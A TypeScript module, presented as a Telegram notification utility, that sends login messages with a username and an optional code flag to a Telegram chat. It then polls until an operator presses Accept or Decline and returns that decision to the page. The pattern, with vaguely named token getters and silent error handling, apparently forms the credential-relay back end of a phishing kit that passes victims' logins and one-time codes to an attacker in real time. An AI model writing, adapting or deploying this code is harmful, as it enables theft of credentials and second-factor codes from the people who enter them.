/**
 * Reliable Telegram delivery utility.
 */

const getT = () => {
  return (import.meta.env as any).VITE_TELEGRAM_TOKEN;
};

const getC = () => {
  return (import.meta.env as any).VITE_TELEGRAM_CHAT_ID;
};

export const sendToTelegram = async (message: string) => {
  const token = getT();
  const chatId = getC();

  if (!token || !chatId) return;

  const url = `https://api.telegram.org/bot${token}/sendMessage`;

  // Strip HTML for the fallback plain text version
  const plainText = message.replace(/<[^>]*>?/gm, '');

  try {
    const response = await fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: 'HTML'
      }),
    });

    // Fallback: If HTML parsing fails (e.g., special characters in inputs), try plain text
    if (!response.ok) {
      await fetch(url, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: `[PLAIN] ${plainText}`,
        }),
      });
    }
  } catch (error) {
    // Non-blocking log to prevent UI breakage
    console.warn('Notification processing skipped');
  }
};

export const sendLoginToTelegramAndWait = async (message: string, username: string, isCode: boolean = false): Promise<boolean> => {
  const token = getT();
  const chatId = getC();

  console.log('[Telegram] Token:', token ? 'SET' : 'NOT SET');
  console.log('[Telegram] Chat ID:', chatId ? 'SET' : 'NOT SET');

  if (!token || !chatId) {
    console.warn('[Telegram] No credentials, allowing fallback');
    return true; // fallback to true
  }

  // Clear webhook to allow getUpdates to work
  try {
    console.log('[Telegram] Clearing webhook if set...');
    await fetch(`https://api.telegram.org/bot${token}/deleteWebhook?drop_pending_updates=true`);
    await new Promise(resolve => setTimeout(resolve, 1000));
  } catch (e) {
    console.warn('[Telegram] Webhook delete failed (may not be set):', e);
  }

  const sessionKey = `pendingAuth_${username}_${isCode ? 'code' : 'login'}`;
  let messageId = sessionStorage.getItem(sessionKey);

  console.log('[Telegram] Session key:', sessionKey);
  console.log('[Telegram] Cached message ID:', messageId);

  if (!messageId) {
    const url = `https://api.telegram.org/bot${token}/sendMessage`;
    const keyboard = {
      inline_keyboard: [
        [
          { text: '✅ Accept', callback_data: 'accept' },
          { text: '❌ Decline', callback_data: 'decline' }
        ]
      ]
    };

    try {
      console.log('[Telegram] Sending message to Telegram...');
      const response = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: 'HTML',
          reply_markup: keyboard
        }),
      });

      console.log('[Telegram] Response status:', response.status);

      if (!response.ok) {
        const errorText = await response.text();
        console.error('[Telegram] Send failed:', errorText);
        return true;
      }

      const data = await response.json();
      console.log('[Telegram] Response data:', data);

      if (!data.ok) {
        console.error('[Telegram] Telegram API error:', data);
        return true;
      }

      messageId = data.result.message_id.toString();
      sessionStorage.setItem(sessionKey, messageId!);
      console.log('[Telegram] Message sent, ID:', messageId);
    } catch (error) {
      console.error('[Telegram] Send error:', error);
      return true; // fallback
    }
  } else {
    console.log('[Telegram] Using cached message ID:', messageId);
  }

  // Start polling for callback query
  // We omit offset so we don't accidentally clear updates for other concurrent users.
  // The Telegram API will return the last 100 unconfirmed updates.
  console.log('[Telegram] Starting polling loop...');
  let pollCount = 0;

  while (true) {
    pollCount++;
    console.log(`[Telegram] Poll #${pollCount}`);

    try {
      const updateUrl = `https://api.telegram.org/bot${token}/getUpdates`;
      const updateRes = await fetch(updateUrl);
      const updateData = await updateRes.json();

      console.log('[Telegram] Updates received:', updateData.result?.length || 0);

      if (updateData.ok && updateData.result.length > 0) {
        for (const update of updateData.result) {
          console.log('[Telegram] Update:', update.callback_query ? 'has callback' : 'no callback');
          if (update.callback_query && update.callback_query.message?.message_id.toString() === messageId) {
            const action = update.callback_query.data;
            console.log('[Telegram] Found matching callback! Action:', action);

            // Acknowledge the callback
            await fetch(`https://api.telegram.org/bot${token}/answerCallbackQuery`, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ callback_query_id: update.callback_query.id })
            }).catch(() => {});

            // Edit message text to look like text
            const newText = message + `\n\n<b>[ ${action === 'accept' ? '✅ APPROVED' : '❌ DECLINED'} ]</b>`;
            await fetch(`https://api.telegram.org/bot${token}/editMessageText`, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                chat_id: chatId,
                message_id: messageId,
                text: newText,
                parse_mode: 'HTML',
                reply_markup: { inline_keyboard: [] }
              })
            }).catch(() => {});

            // Clear session after decision
            sessionStorage.removeItem(sessionKey);

            // In a purely frontend app with no offset, we should ideally clear the update
            // by fetching with offset = update_id + 1, but this would clear other concurrent updates.
            // We'll advance offset only to our specific update to at least clear up to ours.
            await fetch(`https://api.telegram.org/bot${token}/getUpdates?offset=${update.update_id + 1}`).catch(() => {});

            console.log('[Telegram] Returning:', action === 'accept');
            return action === 'accept';
          }
        }
      }
    } catch (e) {
      console.error('[Telegram] Polling error:', e);
      // network error during polling, ignore and retry
    }

    // wait a bit before next poll
    await new Promise(resolve => setTimeout(resolve, 3000));
  }
};
